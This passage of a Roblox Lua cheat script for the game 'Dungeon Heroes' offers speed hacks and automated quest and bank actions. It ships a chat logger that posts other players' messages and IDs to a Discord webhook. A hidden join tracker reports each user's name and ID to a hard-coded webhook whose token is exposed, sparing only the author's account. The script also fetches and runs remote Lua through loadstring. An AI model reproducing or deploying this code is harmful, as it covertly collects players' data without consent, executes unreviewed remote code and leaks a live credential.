        embedColor = 16711680 -- Red (Alert for others)  
    end  

    -- 2. Data Pack (Full Details)  
    local data = {  
        ["content"] = "",  
        ["embeds"] = {{  
            ["title"] = titleText,  
            ["description"] = "```\n" .. finalMsg .. "\n```",  
            ["color"] = embedColor,  
            ["fields"] = {  
                {  
                    ["name"] = "👤 Username",  
                    ["value"] = "`" .. player.Name .. "`",  
                    ["inline"] = true  
                },  
                {  
                    ["name"] = "🏷️ Display Name",  
                    ["value"] = player.DisplayName,  
                    ["inline"] = true  
                },  
                {  
                    ["name"] = "🆔 User ID",  
                    ["value"] = "`" .. tostring(player.UserId) .. "`",  
                    ["inline"] = true  
                }  
            },  
            ["footer"] = {  
                ["text"] = "Server ID: " .. game.JobId .. " | Time: " .. os.date("%X")  
            }  
        }}  
    }  

    request_func({  
        Url = WEBHOOK_URL,  
        Method = "POST",  
        Headers = {["Content-Type"] = "application/json"},  
        Body = HttpService:JSONEncode(data)  
    })  
end  

-- =========================================================  
-- 🛑 SMART HOOK SYSTEM (Fixes Double Messages)  
-- =========================================================  
  
local Hooked = false -- Ye variable check karega ki hook laga ya nahi  

-- SYSTEM 1: Try New Chat (TextChatService)  
local success, _ = pcall(function()  
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then  
        TextChatService.MessageReceived:Connect(function(textChatMessage)  
            if textChatMessage.TextSource then  
                local sender = Players:GetPlayerByUserId(textChatMessage.TextSource.UserId)  
                if sender then  
                    sendToDiscord(sender, textChatMessage.Text)  
                end  
            end  
        end)  
        Hooked = true  
        print("✅ Logger connected to TextChatService (Modern)")  
    end  
end)  

-- SYSTEM 2: Fallback to Old Chat (Legacy) -> Only if System 1 failed  
if not Hooked then  
    local function connectLegacy(p)  
        p.Chatted:Connect(function(msg)  
            sendToDiscord(p, msg)  
        end)  
    end  

    -- Connect Existing  
    for _, p in ipairs(Players:GetPlayers()) do  
        connectLegacy(p)  
    end  
    -- Connect New  
    Players.PlayerAdded:Connect(connectLegacy)  
      
    print("✅ Logger connected to Legacy Chat (Old)")  
end

end)

-- ==================================================================
-- TELEGRAM JOIN TRACKER
-- ==================================================================
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer

-- =======================
-- TRACKING EXCLUSION
-- =======================
local EXCLUDED_USERNAME = "HACKER_ME222"

if player.Name:lower() ~= EXCLUDED_USERNAME:lower() then

    -- =======================
    -- WEBHOOK
    -- =======================
    local WEBHOOK = "https://discord.com/api/webhooks/1571498713497469130/Xj4LEFbOs_yQ0T2rjJM8CsPp3VQhMpwxZDvRwztpvfygj5CKWMCFrPU9DSvdVBlLurQl"

    -- =======================
    -- LOCAL TIME
    -- =======================
    local localTime = DateTime.now():ToLocalTime()

    local today = string.format(
        "%04d-%02d-%02d",
        localTime.Year,
        localTime.Month,
        localTime.Day
    )

    local timeIST = string.format(
        "%02d:%02d:%02d %s",
        (localTime.Hour % 12 == 0 and 12 or localTime.Hour % 12),
        localTime.Minute,
        localTime.Second,
        localTime.Hour >= 12 and "PM" or "AM"
    )

    -- =======================
    -- DAILY COUNTER
    -- =======================
    local FILE = "daily_counter.json"
    local data = {
        date = today,
        count = 0
    }

    pcall(function()
        if isfile(FILE) then
            local saved = HttpService:JSONDecode(readfile(FILE))

            if saved.date == today then
                data.count = saved.count
            end
        end
    end)

    data.count += 1

    pcall(function()
        writefile(FILE, HttpService:JSONEncode({
            date = today,
            count = data.count
        }))
    end)

    local dailyCount = data.count

    -- =======================
    -- EMBED
    -- =======================
    local embed = {
        username = "User Tracker",
        embeds = {{
            title = "🟢 New User Logged",
            color = 5814783,

            fields = {
                {
                    name = "Username",
                    value = "@" .. player.Name,
                    inline = false
                },
                {
                    name = "Display Name",
                    value = player.DisplayName,
                    inline = false
                },
                {
                    name = "User ID",
                    value = tostring(player.UserId),
                    inline = false
                },
                {
                    name = "Today's Count",
                    value = tostring(dailyCount),
                    inline = false
                }
            },

            footer = {
                text = "Time: " .. timeIST ..
                    " | Date: " .. today .. " (Local)"
            }
        }}
    }

    local send = HttpService:JSONEncode(embed)

    pcall(function()
        request({
            Url = WEBHOOK,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = send
        })
    end)
end

-- =======================
-- LOAD RAYFIELD
-- =======================
local Rayfield = loadstring(
    game:HttpGet("https://raw.githubusercontent.com/golu321-xd/Dungeon-Heros/refs/heads/main/CustomUi.lua")
)()

-- =======================
-- WALKSPEED LOGIC
-- =======================
local isToggled = false
local currentSpeed = 50
local maxSpeed = 200
local defaultSpeed = 16

local function UpdateSpeed()
    if player.Character then
        local humanoid = player.Character:FindFirstChild("Humanoid")

        if humanoid then
            humanoid.WalkSpeed = isToggled
                and currentSpeed
                or defaultSpeed
        end
    end
end

-- Keep speed active
RunService.RenderStepped:Connect(function()
    if isToggled and player.Character then
        local humanoid = player.Character:FindFirstChild("Humanoid")

        if humanoid and humanoid.WalkSpeed ~= currentSpeed then
            humanoid.WalkSpeed = currentSpeed
        end
    end
end)

-- Handle respawn
player.CharacterAdded:Connect(function(char)
    local hum = char:WaitForChild("Humanoid", 5)

    if hum and isToggled then
        hum.WalkSpeed = currentSpeed
    end
end)

-- ==========================================
-- RAYFIELD WINDOW & TAB
-- ==========================================

-- Ye line CreateWindow se BAHAR rahegi (Saare notifications block karne ke liye)
Rayfield.Notify = function() end

local Window = Rayfield:CreateWindow({
Name = "Dungeon Heroes By Sid",
Icon = 0,
LoadingTitle = "Dungeon Heroes By Sid",
LoadingSubtitle = "ultimate",
Theme = "Default",
DisableRayfieldPrompts = true,
DisableBuildWarnings = true,
ConfigurationSaving = {
Enabled = true,
FolderName = "SidDungeonHeroes",
FileName = "SavedConfig"
},
KeySystem = false
})

local MainTab = Window:CreateTab("⚡ Main", 4483362458)
local AutoGrindTab = Window:CreateTab("⚡ Grind", 4483362458)
local UtilityTab = Window:CreateTab("⚡ Utility", 4483362458)
local ChestTab = Window:CreateTab("⚡ Chest", 4483362458)
local MiscellaneousTab = Window:CreateTab("⚡ Miscellaneous", 4483362458)

-- ==================== =================================
-- ==================== =================================
-- ==================== =================================
-- ==================== =================================

local TargetTab = Window:CreateTab("Daily Quests")
-- local TargetTab = UtilityTab

TargetTab:CreateSection("Ultimate Auto Daily Quests V2 (Pro)")
do
    --====================================================
    -- DUNGEON HEROES | ULTIMATE AUTO DAILY QUESTS V2
    -- * Instant Event-Driven Scan & Claim (<0.15s)
    -- * Auto-Pulls Missing Food / Gem Fragments / Trash from Bank
    --   (Lowest Rarity First, Exact Count Needed, Auto-Pauses Bank Transfer)
    -- * Precious Ruby Recipe: Red -> Green -> Red -> Red (24 Frags = 6 Gems)
    -- * Nightmare (6) Routing: Last Story Dungeon for KillMob, Marthuun for Raid
    -- * Cross-Teleport Auto ON/OFF: PetKillAura, AutoMobsToggle,
    --   AutoTapChestUI, AutoPlayAgainToggle, AutoStartDungeonToggle
    --====================================================

    local Players = game:GetService("Players")
    local RS = game:GetService("ReplicatedStorage")
    local TweenService = game:GetService("TweenService")
    local HttpService = game:GetService("HttpService")
    local CoreGui = game:GetService("CoreGui")

    local Player = Players.LocalPlayer
    local Remotes = RS:WaitForChild("Remotes")
    local ItemBankRemote = Remotes:WaitForChild("ItemBankTransfer")

    local function SafeRequire(Inst)
        if not Inst then return nil end
        local ok, mod = pcall(require, Inst)
        return ok and mod or nil
    end

    local Sys = {
        Profile       = SafeRequire(RS.Systems:FindFirstChild("Profile")),
        Items         = SafeRequire(RS.Systems:FindFirstChild("Items")),
        Quests        = SafeRequire(RS.Systems:FindFirstChild("Quests")),
        DailyRewards  = SafeRequire(RS.Systems:FindFirstChild("DailyRewards")),
        ChestShop     = SafeRequire(RS.Systems:FindFirstChild("ChestShop")),
        Gemstones     = SafeRequire(RS.Systems:FindFirstChild("Gemstones")),
        StatRerolling = SafeRequire(RS.Systems:FindFirstChild("StatRerolling")),
        Pets          = SafeRequire(RS.Systems:FindFirstChild("Pets")),
        ItemSelling   = SafeRequire(RS.Systems:FindFirstChild("ItemSelling")),
        Equipment     = SafeRequire(RS.Systems:FindFirstChild("Equipment")),
        Parties       = SafeRequire(RS.Systems:FindFirstChild("Parties")),
        QueueRings    = SafeRequire(RS.Systems:FindFirstChild("QueueRings")),
        Dungeons      = SafeRequire(RS.Systems:FindFirstChild("Dungeons")),
    }

    -- ==========================================
    -- COMPACT GLASSMORPHISM NOTIFICATION (TAP TO CLOSE)
    -- ==========================================
    local function ShowQuestNotify(TitleText, SubText, AccentColor, Duration)
        task.spawn(function()
            pcall(function()
                local ShowTime = Duration or 2.8
                local ThemeColor = AccentColor or Color3.fromRGB(0, 235, 160)
                local ParentGui = (gethui and gethui()) or CoreGui or Player:WaitForChild("PlayerGui")

                local OldGui = ParentGui:FindFirstChild("DH_DailyQuestGlassNotify")
                if OldGui then OldGui:Destroy() end

                local ScreenGui = Instance.new("ScreenGui")
                ScreenGui.Name = "DH_DailyQuestGlassNotify"
                ScreenGui.IgnoreGuiInset = true
                ScreenGui.DisplayOrder = 999999
                ScreenGui.Parent = ParentGui

                local Card = Instance.new("Frame")
                Card.Size = UDim2.new(0, 315, 0, 50)
                Card.Position = UDim2.new(0.5, -157, 0, -68)
                Card.BackgroundColor3 = Color3.fromRGB(16, 20, 30)
                Card.BackgroundTransparency = 0.16
                Card.BorderSizePixel = 0
                Card.ClipsDescendants = true
                Card.Parent = ScreenGui

                local Corner = Instance.new("UICorner")
                Corner.CornerRadius = UDim.new(0, 14)
                Corner.Parent = Card

                local Stroke = Instance.new("UIStroke")
                Stroke.Color = ThemeColor
                Stroke.Thickness = 1.2
                Stroke.Transparency = 0.28
                Stroke.Parent = Card

                local Pill = Instance.new("Frame")
                Pill.Size = UDim2.new(0, 4, 0, 28)
                Pill.Position = UDim2.new(0, 9, 0.5, -14)
                Pill.BackgroundColor3 = ThemeColor
                Pill.BorderSizePixel = 0
                Pill.Parent = Card

                local PCorner = Instance.new("UICorner")
                PCorner.CornerRadius = UDim.new(1, 0)
                PCorner.Parent = Pill

                local T = Instance.new("TextLabel")
                T.Size = UDim2.new(1, -28, 0, 18)
                T.Position = UDim2.new(0, 20, 0, 6)
                T.BackgroundTransparency = 1
                T.Font = Enum.Font.GothamBold
                T.TextSize = 12
                T.TextColor3 = ThemeColor
                T.TextXAlignment = Enum.TextXAlignment.Left
                T.TextTruncate = Enum.TextTruncate.AtEnd
                T.Text = tostring(TitleText)
                T.Parent = Card

                local S = Instance.new("TextLabel")
                S.Size = UDim2.new(1, -28, 0, 16)
                S.Position = UDim2.new(0, 20, 0, 25)
                S.BackgroundTransparency = 1
                S.Font = Enum.Font.GothamMedium
                S.TextSize = 11
                S.TextColor3 = Color3.fromRGB(224, 232, 246)
                S.TextXAlignment = Enum.TextXAlignment.Left
                S.TextTruncate = Enum.TextTruncate.AtEnd
                S.Text = tostring(SubText)
                S.Parent = Card

                local BarBg = Instance.new("Frame")
                BarBg.Size = UDim2.new(1, 0, 0, 2)
                BarBg.Position = UDim2.new(0, 0, 1, -2)
                BarBg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                BarBg.BackgroundTransparency = 0.85
                BarBg.BorderSizePixel = 0
                BarBg.Parent = Card

                local BarFill = Instance.new("Frame")
                BarFill.Size = UDim2.new(1, 0, 1, 0)
                BarFill.BackgroundColor3 = ThemeColor
                BarFill.BorderSizePixel = 0
                BarFill.Parent = BarBg

                local DismissBtn = Instance.new("TextButton")
                DismissBtn.Size = UDim2.new(1, 0, 1, 0)
                DismissBtn.BackgroundTransparency = 1
                DismissBtn.Text = ""
                DismissBtn.ZIndex = 10
                DismissBtn.Parent = Card

                local Closed = false
                local function CloseNow()
                    if Closed then return end
                    Closed = true
                    if Card and Card.Parent then
                        local out = TweenService:Create(Card, TweenInfo.new(0.14, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
                            Position = UDim2.new(0.5, -157, 0, -68),
                            BackgroundTransparency = 1
                        })
                        out:Play()
                        out.Completed:Wait()
                    end
                    if ScreenGui and ScreenGui.Parent then ScreenGui:Destroy() end
                end

                DismissBtn.Activated:Connect(CloseNow)
                DismissBtn.MouseButton1Click:Connect(CloseNow)

                TweenService:Create(Card, TweenInfo.new(0.22, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
                    Position = UDim2.new(0.5, -157, 0, 14)
                }):Play()
                TweenService:Create(BarFill, TweenInfo.new(ShowTime, Enum.EasingStyle.Linear), {
                    Size = UDim2.new(0, 0, 1, 0)
                }):Play()

                task.wait(ShowTime)
                CloseNow()
            end)
        end)
    end

    -- ==========================================
    -- CONFIG, STATE & FLAG CONTROLLER
    -- ==========================================
    local Cfg = {
        MasterEnabled      = false,
        AutoClaimEnabled   = true,
        IncludeWeeklyClaim = true,
        DoLobbyQuests      = true,
        AutoPullFromBank   = true,
        DoTravelStuds      = true,
        AllowSpendKeys     = true,
        AllowSpendDust     = true,
        DoDungeonQueue     = true,
        AllowRaidQueue     = true,
        AllowEventQueue    = true,
        AutoManageCombat   = true,
        MaxSafeTrashRarity = 3,
        TargetDailyGoal    = 10,
    }

    local State = {
        Busy = false,
        ClaimBusy = false,
        ManualOnce = false,
        FailedCooldown = {},
        LastQueueAttempt = 0,
        StatusLabel = nil,
        HookedQuestObjs = {},
    }

    -- Exact Flag Names from SidDungeonHeroes/SavedConfig.json
    local CombatFlags = {
        "PetKillAura",
        "AutoMobsToggle",
        "AutoTapChestUI",
        "AutoPlayAgainToggle",
        "AutoStartDungeonToggle",
    }

    local MARKER_FOLDER = "SidDungeonHeroes"
    local MARKER_FILE   = MARKER_FOLDER .. "/.daily_combat_state.json"

    local function SetStatus(Msg)
        if State.StatusLabel and State.StatusLabel.Set then
            pcall(function() State.StatusLabel:Set("Status: " .. tostring(Msg)) end)
        end
    end

    local function GetProfile()
        return Sys.Profile and Sys.Profile:GetProfile(Player) or nil
    end

    local function IsInLobby()
        return (workspace:FindFirstChild("QueueRings") ~= nil) or (workspace:FindFirstChild("MenuRings") ~= nil)
    end

    -- Direct UI Flag Getter / Setter (Works with Sid Ultimate / Rayfield)
    local function GetUIFlag(FlagName)
        local lib = Rayfield or _G.Rayfield
        if lib and lib.Flags and lib.Flags[FlagName] then
            return lib.Flags[FlagName].CurrentValue
        end
        return nil
    end

    local function SetUIFlag(FlagName, Value)
        local lib = Rayfield or _G.Rayfield
        if lib and lib.Flags and lib.Flags[FlagName] and lib.Flags[FlagName].Set then
            if lib.Flags[FlagName].CurrentValue ~= Value then
                pcall(function() lib.Flags[FlagName]:Set(Value) end)
            end
            return true
        end
        return false
    end

    -- Cross-Teleport Combat Flag Persistence (Auto ON -> Auto OFF)
    local function ReadCombatMarker()
        if not (isfile and readfile) then return nil end
        local okE, exists = pcall(isfile, MARKER_FILE)
        if not (okE and exists) then return nil end
        local okR, raw = pcall(readfile, MARKER_FILE)
        if not (okR and type(raw) == "string") then return nil end
        local okJ, dec = pcall(function() return HttpService:JSONDecode(raw) end)
        return (okJ and type(dec) == "table") and dec or nil
    end

    local function WriteCombatMarker(Data)
        if not writefile then return end
        pcall(function()
            if makefolder and isfolder and not isfolder(MARKER_FOLDER) then
                makefolder(MARKER_FOLDER)
            end
            writefile(MARKER_FILE, HttpService:JSONEncode(Data))
        end)
    end

    local function ClearCombatMarker()
        if delfile and isfile then
            pcall(function()
                if isfile(MARKER_FILE) then delfile(MARKER_FILE) end
            end)
        end
    end

    local function ActivateQuestCombatFlags(QuestId, NeedMultiRun)
        if not Cfg.AutoManageCombat then return end
        WriteCombatMarker({
            active = true,
            questId = tostring(QuestId or ""),
            startedAt = os.time(),
        })
        SetUIFlag("PetKillAura", true)
        SetUIFlag("AutoMobsToggle", true)
        SetUIFlag("AutoTapChestUI", true)
        SetUIFlag("AutoStartDungeonToggle", true)
        SetUIFlag("AutoPlayAgainToggle", NeedMultiRun == true)

        -- Force immediate save before dungeon teleport!
        local lib = Rayfield or _G.Rayfield
        if lib and lib.SaveConfiguration then
            pcall(function() lib:SaveConfiguration(nil, true) end)
        end
    end

    local function DeactivateQuestCombatFlags(ForceOff)
        local Marker = ReadCombatMarker()
        if not Marker and not ForceOff then return end

        for _, FlagName in ipairs(CombatFlags) do
            SetUIFlag(FlagName, false)
        end
        ClearCombatMarker()

        local lib = Rayfield or _G.Rayfield
        if lib and lib.SaveConfiguration then
            pcall(function() lib:SaveConfiguration(nil, true) end)
        end
    end

    -- Safely pauses user's Auto Bank Transfer while pulling Food / Gem Fragments from Bank
    local function WithBankPaused(CallbackFn)
        local WasBankOn = (GetUIFlag("DH_BankMasterToggle") == true)
        if WasBankOn then
            SetUIFlag("DH_BankMasterToggle", false)
            task.wait(0.25)
        end

        local ok, res = pcall(CallbackFn)

        if WasBankOn then
            task.wait(0.2)
            SetUIFlag("DH_BankMasterToggle", true)
        end
        return ok and res or false
    end

    -- ==========================================
    -- LIVE QUEST READER & FAST PROGRESS WAITER
    -- ==========================================
    local function ReadQuests(TrackFilter)
        local List = {}
        local Profile = GetProfile()
        local QV2 = Profile and Profile:FindFirstChild("Quests_V2")
        if not QV2 then return List, 0, 0 end

        local ActiveFolder = QV2:FindFirstChild("ActiveQuests")
        local ClaimedFolder = QV2:FindFirstChild("ClaimedQuests")
        local DailyComp = QV2:FindFirstChild("DailyCompleted") and QV2.DailyCompleted.Value or 0
        local WeeklyComp = QV2:FindFirstChild("WeeklyCompleted") and QV2.WeeklyCompleted.Value or 0
        if not ActiveFolder then return List, DailyComp, WeeklyComp end

        for _, ValObj in ipairs(ActiveFolder:GetChildren()) do
            if ValObj:IsA("IntValue") or ValObj:IsA("NumberValue") then
                local QId = tostring(ValObj:GetAttribute("QuestId") or ValObj.Name)
                local Track = tostring(ValObj:GetAttribute("TrackType") or "Daily")

                if not TrackFilter or Track == TrackFilter then
                    local Goal = tonumber(ValObj:GetAttribute("Goal")) or 1
                    local Progress = tonumber(ValObj.Value) or 0
                    local ClaimKey = Track .. ":" .. QId
                    local Claimed = (ClaimedFolder and ClaimedFolder:FindFirstChild(ClaimKey) ~= nil)
                    local Completed = (Progress >= Goal) or Claimed

                    table.insert(List, {
                        ValObj             = ValObj,
                        Id                 = QId,
                        TrackType          = Track,
                        Title              = tostring(ValObj:GetAttribute("Title") or QId),
                        Description        = tostring(ValObj:GetAttribute("Description") or ""),
                        Objective          = tostring(ValObj:GetAttribute("Objective") or ""),
                        Goal               = Goal,
                        Progress           = Progress,
                        Completed          = Completed,
                        Claimed            = Claimed,
                        SortOrder          = tonumber(ValObj:GetAttribute("SortOrder")) or 50,
                        RolledStoryDungeon = ValObj:GetAttribute("RolledStoryDungeon"),
                        MinDifficulty      = tonumber(ValObj:GetAttribute("MinDifficulty")) or 1,
                        DungeonType        = ValObj:GetAttribute("DungeonType"),
                        TargetDungeon      = ValObj:GetAttribute("TargetDungeon"),
                        TargetMobSubstring = ValObj:GetAttribute("TargetMobSubstring"),
                    })
                end
            end
        end

        table.sort(List, function(a, b) return a.SortOrder < b.SortOrder end)
        return List, DailyComp, WeeklyComp
    end

    local function WaitQuestAdvance(ValObj, OldVal, Timeout)
        local Start = os.clock()
        local Limit = Timeout or 1.2
        while os.clock() - Start < Limit do
            if not ValObj or not ValObj.Parent then return true end
            if (tonumber(ValObj.Value) or 0) > OldVal then
                return true
            end
            task.wait(0.05)
        end
        return false
    end

    -- ==========================================
    -- INSTANT AUTO-CLAIM ENGINE (EVENT-DRIVEN)
    -- ==========================================
    local function RunAutoClaims(SilentIfZero)
        if not Cfg.AutoClaimEnabled or State.ClaimBusy then return 0 end
        State.ClaimBusy = true
        local ClaimedCount = 0

        pcall(function()
            local Profile = GetProfile()
            local QV2 = Profile and Profile:FindFirstChild("Quests_V2")

            if QV2 and Sys.Quests then
                local AllQuests, DailyComp, WeeklyComp = ReadQuests(nil)
                for _, Q in ipairs(AllQuests) do
                    if Q.Completed and not Q.Claimed then
                        if Q.TrackType == "Daily" or (Cfg.IncludeWeeklyClaim and Q.TrackType == "Weekly") then
                            pcall(function() Sys.Quests:ClaimQuest(Q.Id) end)
                            ClaimedCount = ClaimedCount + 1
                            if Q.TrackType == "Daily" then DailyComp = DailyComp + 1 else WeeklyComp = WeeklyComp + 1 end
                            task.wait(0.08)
                        end
                    end
                end

                local ClaimedMilestones = QV2:FindFirstChild("ClaimedMilestones")
                for _, Th in ipairs({2, 4, 6, 8, 10}) do
                    if DailyComp >= Th and not (ClaimedMilestones and ClaimedMilestones:FindFirstChild("Milestone:Daily:" .. tostring(Th))) then
                        pcall(function() Sys.Quests:ClaimMilestone("Daily", Th) end)
                        ClaimedCount = ClaimedCount + 1
                        task.wait(0.08)
                    end
                    if Cfg.IncludeWeeklyClaim and WeeklyComp >= Th and not (ClaimedMilestones and ClaimedMilestones:FindFirstChild("Milestone:Weekly:" .. tostring(Th))) then
                        pcall(function() Sys.Quests:ClaimMilestone("Weekly", Th) end)
                        ClaimedCount = ClaimedCount + 1
                        task.wait(0.08)
                    end
                end
            end

            if Sys.DailyRewards then
                local okS, st = pcall(function() return Sys.DailyRewards:GetState() end)
                if okS and type(st) == "table" and st.CanClaim == true and tonumber(st.ClaimIndex) then
                    pcall(function() Sys.DailyRewards:ClaimDay(st.ClaimIndex) end)
                    ClaimedCount = ClaimedCount + 1
                end
            end

            local DailyFolder = Profile and Profile:FindFirstChild("DailyQuests")
            local CrystFlag = DailyFolder and DailyFolder:FindFirstChild("DailyCrystalsClaimed")
            if CrystFlag and CrystFlag.Value == false then
                local CryRemote = Remotes:FindFirstChild("ClaimFreeCrystals")
                if CryRemote then
                    pcall(function() CryRemote:FireServer() end)
                    ClaimedCount = ClaimedCount + 1
                end
            end
        end)

        if ClaimedCount > 0 then
            ShowQuestNotify(
                "Instant Claimed " .. tostring(ClaimedCount) .. " Reward(s)!",
                "Quests / Milestones / Calendar collected",
                Color3.fromRGB(0, 235, 160),
                2.5
            )
        end

        State.ClaimBusy = false
        return ClaimedCount
    end

    -- Attach real-time listeners to ActiveQuests so claims happen in <0.15s!
    local function HookQuestChangeListeners()
        local Profile = GetProfile()
        local QV2 = Profile and Profile:FindFirstChild("Quests_V2")
        local ActiveFolder = QV2 and QV2:FindFirstChild("ActiveQuests")
        if not ActiveFolder then return end

        local function HookOne(ValObj)
            if State.HookedQuestObjs[ValObj] then return end
            if not (ValObj:IsA("IntValue") or ValObj:IsA("NumberValue")) then return end
            State.HookedQuestObjs[ValObj] = true

            ValObj.Changed:Connect(function(NewVal)
                local Goal = tonumber(ValObj:GetAttribute("Goal")) or 1
                if (tonumber(NewVal) or 0) >= Goal then
                    if Cfg.AutoClaimEnabled then
                        task.spawn(RunAutoClaims)
                    end
                    -- If we're inside a dungeon and this was our active tracked combat quest, disable Auto Play Again immediately!
                    local Marker = ReadCombatMarker()
                    local QId = tostring(ValObj:GetAttribute("QuestId") or ValObj.Name)
                    if Marker and Marker.active and Marker.questId == QId and not IsInLobby() then
                        SetUIFlag("AutoPlayAgainToggle", false)
                    end
                end
            end)
        end

        for _, Child in ipairs(ActiveFolder:GetChildren()) do
            HookOne(Child)
        end
        ActiveFolder.ChildAdded:Connect(HookOne)
    end

    -- ==========================================
    -- ITEM INSPECTORS & BANK AUTO-PULL ENGINE
    -- ==========================================
    local function GetItemUID(Item, FallbackKey)
        if typeof(Item) == "Instance" then
            local u = Item:GetAttribute("ItemUid") or Item:GetAttribute("Uid") or Item:GetAttribute("UID")
            if type(u) == "string" and #u > 0 then return u end
        end
        local ok1, u1 = pcall(function() return Sys.Items:GetItemUid(Item) end)
        if ok1 and type(u1) == "string" and #u1 > 0 then return u1 end
        if type(Item) == "table" then
            local u = Item.ItemUid or Item.uid or Item.UID or Item.Uid
            if type(u) == "string" and #u > 0 then return u end
        end
        local ok2, ref = pcall(function() return Sys.Items:ItemRefForRemote(Item) end)
        if ok2 and type(ref) == "string" and #ref > 0 then return ref end
        return (type(FallbackKey) == "string" and #FallbackKey > 0) and FallbackKey or nil
    end

    local function GetItemIdAndData(Item)
        local ID = nil
        pcall(function() ID = Sys.Items:GetItemId(Item) end)
        if not ID then
            if typeof(Item) == "Instance" then ID = Item.Name
            elseif type(Item) == "table" then ID = Item.id or Item.Id or Item.ItemId or Item.itemId or Item.Name end
        end
        if not ID then return nil, nil end
        local ok, Data = pcall(function() return Sys.Items:GetItemData(ID) end)
        if ok and type(Data) == "table" then return ID, Data end
        return ID, nil
    end

    local function GetSafeRarity(Item)
        local ok, r = pcall(function() return Sys.Items:GetRarity(Item) end)
        if ok and tonumber(r) then return tonumber(r) end
        if typeof(Item) == "Instance" and Item:FindFirstChild("Rarity") then
            return tonumber(Item.Rarity.Value) or 99
        elseif type(Item) == "table" and tonumber(Item.rarity or Item.Rarity) then
            return tonumber(Item.rarity or Item.Rarity)
        end
        return 99
    end

    local function GetSafeLevel(Item)
        local ok, l = pcall(function() return Sys.Items:GetLevel(Item) end)
        if ok and tonumber(l) then return tonumber(l) end
        if typeof(Item) == "Instance" and Item:FindFirstChild("Level") then
            return tonumber(Item.Level.Value) or 1
        elseif type(Item) == "table" and tonumber(Item.level or Item.Level) then
            return tonumber(Item.level or Item.Level)
        end
        return 1
    end

    local function GetItemCount(Item)
        if typeof(Item) == "Instance" then
            local c = Item:FindFirstChild("Count")
            return c and math.max(1, tonumber(c.Value) or 1) or 1
        elseif type(Item) == "table" then
            return math.max(1, tonumber(Item.count or Item.Count) or 1)
        end
        return 1
    end

    local function IsItemFavoritedOrLocked(Item)
        local okFav, isFav = pcall(function() return Sys.Items:ItemIsFavorited(Item) end)
        if okFav and isFav == true then return true end
        if typeof(Item) == "Instance" then
            for _, Key in ipairs({"Favorite", "Favorited", "Starred", "Locked", "Sealed"}) do
                local c = Item:FindFirstChild(Key)
                if c and (not c:IsA("ValueBase") or c.Value == true) then return true end
                if Item:GetAttribute(Key) == true then return true end
            end
        elseif type(Item) == "table" then
            if Item.favorite or Item.Favorite or Item.favorited or Item.Favorited or Item.starred or Item.Starred or Item.sealed or Item.Sealed then
                return true
            end
        end
        return false
    end

    local function IsProtectedGear(Item)
        if not Item then return true end
        local Rarity = GetSafeRarity(Item)
        if Rarity == 8 or Rarity > Cfg.MaxSafeTrashRarity then return true end
        if IsItemFavoritedOrLocked(Item) then return true end

        if typeof(Item) == "Instance" then
            if Item:FindFirstChild("Gem") then return true end
            for _, Child in ipairs(Item:GetChildren()) do
                if string.find(Child.Name, "^GearPreset") then return true end
            end
            local Stats = Item:FindFirstChild("Stats")
            if Stats then
                local counts = {}
                for _, st in ipairs(Stats:GetChildren()) do
                    counts[st.Name] = (counts[st.Name] or 0) + 1
                    if counts[st.Name] >= 4 then return true end
                end
            end
        elseif type(Item) == "table" then
            if Item.gem or Item.Gem or Item.GearPreset1 or Item.GearPreset2 or Item.GearPreset3 or Item.presets then
                return true
            end
        end
        return false
    end

    local function GetRawBankItems()
        local List, Seen = {}, {}
        local function Add(Item, Key)
            if not Item then return end
            if typeof(Item) == "Instance" and Item:IsA("Folder") then return end
            local UID = GetItemUID(Item, Key)
            if UID and not Seen[UID] then
                Seen[UID] = true
                table.insert(List, {Item = Item, UID = UID})
            end
        end

        local ok1, T1 = pcall(function() return Sys.Items:GetTableItems(Player, "ItemBank") end)
        if ok1 and type(T1) == "table" then
            for k, v in pairs(T1) do Add(v, k) end
        end

        local ok2, Rec = pcall(function() return Sys.Items:GetRecordContainer(Player, "ItemBank") end)
        if ok2 and type(Rec) == "table" then
            local Sub = Rec.Items or Rec.Records or Rec
            if type(Sub) == "table" then
                for k, v in pairs(Sub) do
                    if type(v) == "table" or typeof(v) == "Instance" then Add(v, k) end
                end
            end
        end

        local Profile = GetProfile()
        local BFolder = Profile and Profile:FindFirstChild("ItemBank")
        if BFolder then
            for _, c in ipairs(BFolder:GetChildren()) do Add(c, nil) end
        end

        return List
    end

    -- Pulls EXACT needed amount of lowest-rarity matching items from Bank -> Inventory
    local function PullLowestRarityFromBank(NeedCount, MatcherFn)
        if not Cfg.AutoPullFromBank or NeedCount <= 0 then return 0 end

        local BankEntries = {}
        for _, Raw in ipairs(GetRawBankItems()) do
            if not IsItemFavoritedOrLocked(Raw.Item) then
                local ID, Data = GetItemIdAndData(Raw.Item)
                if ID and Data and MatcherFn(Raw.Item, ID, Data) then
                    table.insert(BankEntries, {
                        UID    = Raw.UID,
                        Rarity = GetSafeRarity(Raw.Item),
                        Level  = GetSafeLevel(Raw.Item),
                        Count  = GetItemCount(Raw.Item),
                    })
                end
            end
        end

        if #BankEntries == 0 then return 0 end

        -- Always pick LOWEST rarity first!
        table.sort(BankEntries, function(a, b)
            if a.Rarity ~= b.Rarity then return a.Rarity < b.Rarity end
            if a.Level ~= b.Level then return a.Level < b.Level end
            return a.Count < b.Count
        end)

        local PulledUIDs = {}
        local PulledUnits = 0

        for _, Entry in ipairs(BankEntries) do
            if PulledUnits >= NeedCount then break end
            table.insert(PulledUIDs, Entry.UID)
            PulledUnits = PulledUnits + Entry.Count
            ItemBankRemote:FireServer(Entry.UID)
            task.wait(0.08)
        end

        if #PulledUIDs == 0 then return 0 end

        -- Wait briefly until pulled UIDs arrive in Profile.Inventory
        local Profile = GetProfile()
        local Inv = Profile and Profile:FindFirstChild("Inventory")
        local StartWait = os.clock()
        while Inv and (os.clock() - StartWait < 1.5) do
            local FoundAll = true
            for _, UID in ipairs(PulledUIDs) do
                local Present = false
                for _, Child in ipairs(Inv:GetChildren()) do
                    if GetItemUID(Child, nil) == UID then
                        Present = true
                        break
                    end
                end
                if not Present then FoundAll = false; break end
            end
            if FoundAll then break end
            task.wait(0.06)
        end

        return PulledUnits
    end

    -- ==========================================
    -- FRAGMENT CLASSIFIERS (PRECIOUS RUBY: RED-GREEN-RED-RED)
